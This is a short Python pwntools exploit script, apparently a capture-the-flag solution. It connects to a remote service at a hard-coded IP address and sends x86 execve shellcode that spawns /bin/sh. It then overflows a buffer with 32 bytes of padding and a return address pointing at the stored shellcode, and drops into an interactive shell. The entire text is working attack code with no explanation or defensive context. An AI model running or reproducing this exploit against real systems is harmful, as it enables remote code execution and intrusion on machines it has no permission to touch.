from pwn import *
p=remote('121.42.189.18',10003)
#p=process('./pwn')
offset=32
shellcode='\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
log.info(len(shellcode))
payload=shellcode
print 	p.recv()
p.sendline(payload)
raw_input("stop");
print p.recv()
p.sendline('A'*offset+p32(0x804A060))
p.interactive();
